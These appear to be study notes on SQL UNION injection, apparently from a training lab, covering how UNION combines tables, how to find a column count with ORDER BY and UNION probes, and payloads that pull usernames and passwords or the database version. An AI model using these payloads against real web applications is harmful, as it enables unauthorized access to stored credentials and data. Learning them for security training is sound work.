#### Union Clause

```shell-session
SELECT * FROM ports UNION SELECT * FROM ships;
```
UNION combines two tables together (only works on tables with same number of columns)

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The products table has 2 columns, so in order to union it, we can join 2 columns of usernames
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

If products tables is 4 columns, we can do:
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```


#### Union Injection

Detect number of columns:
- Using ORDER BY
- Using UNION

Order by 1 -> success
Order by 2 -> success
Order by 3 -> success
Order by 4 -> fail
We know there are 3 columns in the table

```sql
' order by 1-- -
```
Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).


Using UNION to find number of columns:
```sql
cn' UNION select 1,2,3-- -
```
Error ^
```sql
cn' UNION select 1,2,3,4-- -
```
Success ^

You must place injection output in columns that are actually displayed to the screen.

```sql
cn' UNION select 1,@@version,3,4-- -
```

